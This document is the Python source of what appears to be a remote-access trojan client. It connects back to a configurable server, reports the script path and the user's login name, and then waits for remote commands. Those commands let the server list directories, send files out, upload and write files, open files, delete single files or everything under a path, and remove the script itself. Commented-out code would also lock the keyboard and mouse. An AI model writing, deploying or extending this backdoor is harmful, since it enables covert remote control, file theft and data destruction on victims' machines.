import os
import socket
#from pynput import *
import time


hostname = socket.gethostname()
host = '127.0.0.1' #Change to server IP Address for online
port = 5219
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

print("---Connected To Server---")
print("")


def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]


syspath = os.path.abspath(__file__)
syspath = syspath.encode()
s.send(syspath)
time.sleep(0.2)
username = os.getlogin()
username = username.encode()
s.send(username)


while True:
    try:
        command = s.recv(1024)
        command = command.decode()

        if command == "view_cwd":
            files = os.getcwd()
            files = str(files)
            s.send(files.encode())


        elif command == "custom_dir":
            print("Custom Directory")
            cmd_input = s.recv(5000)
            cmd_input = cmd_input.decode()
            files = os.listdir(cmd_input)
            files = str(files)
            s.send(files.encode())

        elif command == "download_file":
            file_path = s.recv(5000)
            file_path = file_path.decode()
            with open(file_path, 'rb') as file_to_send:
                for data in file_to_send:
                    s.sendall(data)
            
            
        elif command == "delete_file":
            file_path = s.recv(5000)
            file_path = file_path.decode()
            file = os.remove(str(file_path))

        elif command == "send_file":
            dir_path = s.recv(5000)
            dir_path = dir_path.decode()
            file_name = s.recv(5000)
            file_name = file_name.decode()
            with open(os.path.join(dir_path, file_name), 'wb') as file_to_write:
                while True:
                    data = s.recv(10000)
                    if not data:
                        break
                    file_to_write.write(data)
                file_to_write.close()



        elif command == "open_file":
            filepath = s.recv(5000)
            filepath = filepath.decode()
            os.system(f'open {filepath}')

        elif command ==  "delete_all_files":
            dir_path = syspath
            res = []
            for (dir_path, dir_names, file_names) in os.walk(dir_path): #move os.remove to directly to first loop to speed up
                res.extend(file_names)


            for file in res:
                try:
                    os.remove(str(dir_path) + '/' + str(file))
                except:
                    pass


        elif command.lower() == "self-destruct":
            '''
            keyboard = keyboard.Listener(supress=True)
            keyboard.start()
            mouse = mouse.Listener(suppress=True)
            mouse.start()
            pathfile = os.path.abspath(__file__)
            os.remove(pathfile)
            '''
            pathfile = os.path.abspath(__file__)
            os.remove(pathfile)
            pass
        
        elif command == "SHUTDOWN":
            try:
                pathfile = os.path.abspath(__file__)
                os.remove(pathfile)

            except:
                pathfile = os.path.abspath(__file__)
                os.remove(pathfile)

        else:
            pass
    except:
        pass
